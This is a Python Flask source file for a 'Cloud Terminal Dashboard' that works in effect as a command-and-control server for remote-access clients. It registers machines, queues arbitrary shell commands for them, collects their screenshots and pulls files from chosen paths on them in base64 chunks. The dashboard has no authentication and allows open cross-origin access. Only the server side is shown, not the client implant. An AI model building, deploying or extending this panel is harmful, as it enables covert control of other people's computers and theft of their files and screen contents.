# server_with_filebrowser.py - Complete dashboard with file browser

from flask import Flask, request, jsonify, render_template_string, send_from_directory
from flask_cors import CORS
import base64
import os
import uuid

app = Flask(__name__)
CORS(app)

clients = {}
commands = {}
file_chunks = {}

UPLOAD_FOLDER = os.environ.get('UPLOAD_FOLDER', '/tmp/data')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Complete HTML with File Browser
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Cloud Terminal Dashboard - File Manager</title>
    <style>
        body { background:#111; color:#eee; font-family:Arial; margin:20px; }
        .container { display: flex; gap: 20px; }
        .clients-panel { flex: 1; }
        .files-panel { flex: 1; background:#1a1a1a; border-radius:5px; padding:15px; }
        .client { border:1px solid #444; padding:10px; margin:10px 0; border-radius:5px; background:#1a1a1a; }
        input { width:300px; padding:8px; margin:5px; background:#333; color:#fff; border:1px solid #555; border-radius:3px; }
        input:focus { outline:none; border-color:#00ff00; }
        pre {
            background:#000;
            color:#00ff00;
            padding:10px;
            height:200px;
            overflow-y:auto;
            font-family:monospace;
            border-radius:5px;
            margin-top:10px;
            font-size:12px;
        }
        img { margin-top:10px; border:1px solid #333; max-width:300px; border-radius:5px; }
        button {
            background:#00ff00;
            color:black;
            border:none;
            padding:8px 15px;
            margin:2px;
            cursor:pointer;
            border-radius:3px;
            font-weight:bold;
        }
        button:hover { background:#00cc00; transform:scale(1.02); }
        .upload-btn { background:#ff6600; }
        .upload-btn:hover { background:#ff4400; }
        .download-btn { background:#0066cc; }
        .download-btn:hover { background:#0055aa; }
        .delete-btn { background:#cc0000; }
        .delete-btn:hover { background:#aa0000; }
        .refresh-btn { background:#444; }
        .progress-container {
            width:100%;
            background-color:#333;
            margin:10px 0;
            border-radius:5px;
            display:none;
        }
        .progress-bar {
            width:0%;
            height:25px;
            background-color:#00ff00;
            text-align:center;
            line-height:25px;
            color:black;
            border-radius:5px;
            transition:width 0.3s;
            font-weight:bold;
        }
        .status { 
            color:#00ff00; 
            margin:5px; 
            padding:10px;
            background:#1a1a1a;
            border-radius:5px;
            font-family:monospace;
        }
        h1, h2 { color:#00ff00; }
        .client-header { 
            display:flex; 
            justify-content:space-between; 
            align-items:center;
            margin-bottom:10px;
        }
        .client-id { 
            background:#333; 
            padding:5px 10px; 
            border-radius:5px;
            font-family:monospace;
        }
        .file-item {
            background:#222;
            padding:8px;
            margin:5px 0;
            border-radius:3px;
            display:flex;
            justify-content:space-between;
            align-items:center;
            font-family:monospace;
            font-size:12px;
        }
        .file-item:hover { background:#2a2a2a; }
        .file-name { flex:1; cursor:pointer; color:#00ff00; }
        .file-size { margin:0 10px; color:#888; }
        .file-actions button { margin-left:5px; padding:3px 8px; font-size:11px; }
        .files-list {
            max-height: 400px;
            overflow-y: auto;
            margin-top: 10px;
        }
        .files-header {
            display:flex;
            justify-content:space-between;
            align-items:center;
            margin-bottom:10px;
            padding-bottom:10px;
            border-bottom:1px solid #444;
        }
    </style>
</head>
<body>
    <h1>☁️ Cloud Terminal Dashboard with File Manager</h1>
    <div class="container">
        <div class="clients-panel">
            <h2>🖥️ Connected Clients</h2>
            <div class="status" id="status">Loading clients...</div>
            <div id="clients"></div>
        </div>
        
        <div class="files-panel">
            <h2>📁 Server Files</h2>
            <div class="files-header">
                <button class="refresh-btn" onclick="refreshFiles()">🔄 Refresh File List</button>
                <span id="fileCount" style="color:#888;">0 files</span>
            </div>
            <div id="filesList" class="files-list">
                <div style="text-align:center; color:#888;">Click refresh to load files</div>
            </div>
        </div>
    </div>

    <script>
        let clientsData = {};
        let currentClientId = null;
        let refreshInterval = null;
        
        // Add client to UI
        function addClientToUI(id) {
            if (document.getElementById(`client-${id}`)) return;
            
            let container = document.getElementById("clients");
            let clientDiv = document.createElement("div");
            clientDiv.className = "client";
            clientDiv.id = `client-${id}`;
            clientDiv.innerHTML = `
                <div class="client-header">
                    <h3>🖥️ Client <span class="client-id">${id}</span></h3>
                    <button onclick="selectClient('${id}')" style="background:#0066cc;">Select</button>
                </div>
                
                <input type="text" id="cmd${id}" placeholder="Enter command" size="45">
                <button onclick="sendCmd('${id}')">Send</button>
                <button onclick="sendQuick('${id}','screenshot')">📸 Screenshot</button>
                
                <br><br>
                
                <input type="text" id="upload${id}" placeholder="File path on client (e.g., C:\\\\test.txt)" size="45">
                <button class="upload-btn" onclick="uploadFile('${id}')">⬆️ Upload to Server</button>
                
                <div class="progress-container" id="progressContainer${id}">
                    <div class="progress-bar" id="progressBar${id}">0%</div>
                </div>
                
                <pre id="out${id}">[Ready]\\n</pre>
                <img id="img${id}" style="max-width:300px; display:none;"/>
            `;
            container.appendChild(clientDiv);
        }
        
        function selectClient(id) {
            currentClientId = id;
            document.getElementById("status").innerHTML = `✅ Selected client: ${id}`;
            refreshFiles();
        }
        
        function sendCmd(id) {
            let input = document.getElementById("cmd"+id);
            let cmd = input.value;
            if(!cmd) return;
            
            fetch('/send_command/'+id, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({command:cmd})
            });
            input.value = "";
            addOutput(id, `> ${cmd}\\n`);
        }
        
        function sendQuick(id, cmd) {
            fetch('/send_command/'+id, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({command:cmd})
            });
            addOutput(id, `> ${cmd}\\n`);
        }
        
        function uploadFile(id) {
            let filepath = document.getElementById("upload"+id).value;
            if(!filepath) {
                alert("Please enter a file path");
                return;
            }
            sendQuick(id, "upload " + filepath);
        }
        
        function addOutput(id, text) {
            let el = document.getElementById("out"+id);
            if(el) {
                el.textContent += text;
                el.scrollTop = el.scrollHeight;
            }
        }
        
        // File Browser Functions
        async function refreshFiles() {
            try {
                const response = await fetch('/list_all_files');
                const files = await response.json();
                displayFiles(files);
                document.getElementById("fileCount").innerHTML = `${files.length} files`;
            } catch (error) {
                console.error('Error loading files:', error);
            }
        }
        
        function displayFiles(files) {
            let container = document.getElementById("filesList");
            if (!files || files.length === 0) {
                container.innerHTML = '<div style="text-align:center; color:#888;">No files uploaded yet</div>';
                return;
            }
            
            let html = '';
            files.forEach(file => {
                let fileSize = formatFileSize(file.size);
                let fileIcon = getFileIcon(file.name);
                
                html += `
                    <div class="file-item">
                        <div class="file-name" ondblclick="downloadFile('${file.name}')" title="Double-click to download">
                            ${fileIcon} ${file.name}
                        </div>
                        <div class="file-size">${fileSize}</div>
                        <div class="file-actions">
                            <button class="download-btn" onclick="downloadFile('${file.name}')">📥 Download</button>
                            <button class="delete-btn" onclick="deleteFile('${file.name}')">🗑️ Delete</button>
                        </div>
                    </div>
                `;
            });
            container.innerHTML = html;
        }
        
        function getFileIcon(filename) {
            let ext = filename.split('.').pop().toLowerCase();
            const icons = {
                'txt': '📄', 'py': '🐍', 'js': '📜', 'html': '🌐', 'css': '🎨',
                'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️',
                'zip': '📦', 'rar': '📦', '7z': '📦', 'exe': '⚙️', 'msi': '⚙️',
                'pdf': '📕', 'doc': '📘', 'docx': '📘', 'xls': '📗', 'xlsx': '📗'
            };
            return icons[ext] || '📁';
        }
        
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }
        
        async function downloadFile(filename) {
            try {
                window.open(`/download_server_file/${filename}`, '_blank');
                addOutput(currentClientId || 'client', `[+] Download started: ${filename}\\n`);
            } catch (error) {
                alert('Download failed: ' + error);
            }
        }
        
        async function deleteFile(filename) {
            if (!confirm(`Delete ${filename}?`)) return;
            
            try {
                const response = await fetch(`/delete_file/${filename}`, { method: 'DELETE' });
                const result = await response.json();
                if (result.success) {
                    refreshFiles();
                    if (currentClientId) {
                        addOutput(currentClientId, `[+] Deleted: ${filename}\\n`);
                    }
                } else {
                    alert('Delete failed: ' + result.error);
                }
            } catch (error) {
                alert('Delete failed: ' + error);
            }
        }
        
        // Poll for updates
        async function pollUpdates() {
            // Get client list
            const clientsRes = await fetch('/get_clients');
            const clients = await clientsRes.json();
            
            Object.keys(clients).forEach(id => {
                if (!clientsData[id]) {
                    addClientToUI(id);
                }
            });
            clientsData = clients;
            document.getElementById("status").innerHTML = `✅ Connected - ${Object.keys(clientsData).length} client(s) online`;
            
            // Get outputs
            const outputsRes = await fetch('/get_outputs');
            const outputs = await outputsRes.json();
            for(let id in outputs) {
                if(outputs[id]) {
                    addOutput(id, outputs[id]);
                }
            }
            
            // Get screenshots
            const screenshotsRes = await fetch('/get_screenshots');
            const screenshots = await screenshotsRes.json();
            for(let id in screenshots) {
                let img = document.getElementById("img"+id);
                if(img && screenshots[id]) {
                    img.style.display = "block";
                    img.src = screenshots[id] + "?t=" + Date.now();
                }
            }
            
            // Get progress
            const progressRes = await fetch('/get_progress');
            const progress = await progressRes.json();
            for(let id in progress) {
                let container = document.getElementById("progressContainer"+id);
                let bar = document.getElementById("progressBar"+id);
                if(container && bar && progress[id] > 0) {
                    container.style.display = "block";
                    bar.style.width = progress[id] + "%";
                    bar.textContent = progress[id] + "%";
                    if(progress[id] >= 100) {
                        setTimeout(() => {
                            container.style.display = "none";
                            bar.style.width = "0%";
                        }, 2000);
                    }
                }
            }
        }
        
        // Start polling
        pollUpdates();
        refreshFiles();
        setInterval(pollUpdates, 2000);
        setInterval(refreshFiles, 5000); // Auto-refresh file list every 5 seconds
        
        // Handle Enter key
        document.addEventListener("keypress", function(e) {
            if (e.key === "Enter") {
                let active = document.activeElement;
                if (active.id && active.id.startsWith("cmd")) {
                    let id = active.id.replace("cmd","");
                    sendCmd(id);
                }
            }
        });
    </script>
</body>
</html>
"""

@app.route("/")
def dashboard():
    return render_template_string(HTML)

# API Endpoints
@app.route("/get_clients")
def get_clients():
    return jsonify(clients)

@app.route("/get_outputs")
def get_outputs():
    outputs = {}
    for client_id in clients:
        if 'output' in clients[client_id] and clients[client_id]['output']:
            outputs[client_id] = clients[client_id]['output']
            clients[client_id]['output'] = ''
    return jsonify(outputs)

@app.route("/get_screenshots")
def get_screenshots():
    screenshots = {}
    for client_id in clients:
        if 'screenshot' in clients[client_id]:
            screenshots[client_id] = clients[client_id]['screenshot']
    return jsonify(screenshots)

@app.route("/get_progress")
def get_progress():
    progress = {}
    for client_id in clients:
        if 'progress' in clients[client_id] and clients[client_id]['progress'] > 0:
            progress[client_id] = clients[client_id]['progress']
    return jsonify(progress)

@app.route("/list_all_files")
def list_all_files():
    """List all files in the upload folder with details"""
    try:
        files = []
        for filename in os.listdir(UPLOAD_FOLDER):
            filepath = os.path.join(UPLOAD_FOLDER, filename)
            if os.path.isfile(filepath):
                files.append({
                    'name': filename,
                    'size': os.path.getsize(filepath),
                    'modified': os.path.getmtime(filepath)
                })
        # Sort by modified time (newest first)
        files.sort(key=lambda x: x['modified'], reverse=True)
        return jsonify(files)
    except Exception as e:
        return jsonify([])

@app.route("/download_server_file/<filename>")
def download_server_file(filename):
    """Download a file from the server"""
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(file_path):
        return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)
    else:
        return jsonify({"error": "File not found"}), 404

@app.route("/delete_file/<filename>", methods=["DELETE"])
def delete_file(filename):
    """Delete a file from the server"""
    try:
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(file_path):
            os.remove(file_path)
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "error": "File not found"}), 404
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/register", methods=["POST"])
def register():
    client_id = str(uuid.uuid4())[:8]
    clients[client_id] = {
        'connected': True,
        'output': '',
        'progress': 0
    }
    commands[client_id] = []
    print(f"[+] Client registered: {client_id}")
    return jsonify({"client_id": client_id})

@app.route("/get_command/<client_id>")
def get_command(client_id):
    if client_id in commands and commands[client_id]:
        cmd = commands[client_id].pop(0)
        return jsonify({"command": cmd})
    return jsonify({"command": None})

@app.route("/send_command/<client_id>", methods=["POST"])
def send_command(client_id):
    cmd = request.json.get("command")
    if client_id not in commands:
        commands[client_id] = []
    commands[client_id].append(cmd)
    print(f"[+] Command to {client_id}: {cmd}")
    return jsonify({"status": "sent"})

@app.route("/send_result/<client_id>", methods=["POST"])
def send_result(client_id):
    data = request.json
    
    if "output" in data:
        if client_id not in clients:
            clients[client_id] = {}
        clients[client_id]['output'] = data["output"]
    
    if "screenshot" in data:
        img = base64.b64decode(data["screenshot"])
        path = os.path.join(UPLOAD_FOLDER, f"client{client_id}.png")
        with open(path, "wb") as f:
            f.write(img)
        clients[client_id]['screenshot'] = f"/files/client{client_id}.png"
        print(f"[+] Screenshot from {client_id}")
    
    return jsonify({"status": "ok"})

@app.route("/upload_chunk", methods=["POST"])
def upload_chunk():
    data = request.json
    client_id = data["id"]
    filename = data["filename"]
    chunk_index = data["index"]
    total_chunks = data["total"]
    chunk_data = base64.b64decode(data["data"])
    
    key = f"{client_id}_{filename}"
    
    if key not in file_chunks:
        file_chunks[key] = [None] * total_chunks
    
    file_chunks[key][chunk_index] = chunk_data
    percent = int((chunk_index + 1) / total_chunks * 100)
    
    if client_id in clients:
        clients[client_id]['progress'] = percent
    
    if all(chunk is not None for chunk in file_chunks[key]):
        file_path = os.path.join(UPLOAD_FOLDER, key)
        with open(file_path, "wb") as f:
            for chunk in file_chunks[key]:
                f.write(chunk)
        del file_chunks[key]
        
        if client_id in clients:
            clients[client_id]['output'] = f"[+] File uploaded: {filename}\n[+] Saved as: {key}\n"
            clients[client_id]['progress'] = 0
    
    return jsonify({"status": "ok"})

@app.route("/files/<path:filename>")
def files(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print(f"[*] Server starting on port {port}")
    print(f"[*] Dashboard with File Browser: http://localhost:{port}")
    app.run(host='0.0.0.0', port=port, debug=False)
